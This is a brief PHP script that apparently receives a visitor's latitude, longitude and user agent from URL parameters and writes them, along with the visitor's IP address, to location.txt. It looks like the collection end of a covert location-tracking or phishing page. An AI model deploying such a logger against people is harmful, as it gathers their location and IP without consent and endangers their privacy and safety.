<?php

$myfile = fopen("location.txt", "w");
$txt = "lat: " . $_GET["lat"] . "nlong: " . $_GET["long"]. "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nUSER agent :" . $_GET["uagent"];
fwrite($myfile, $txt);
fclose($myfile);


?>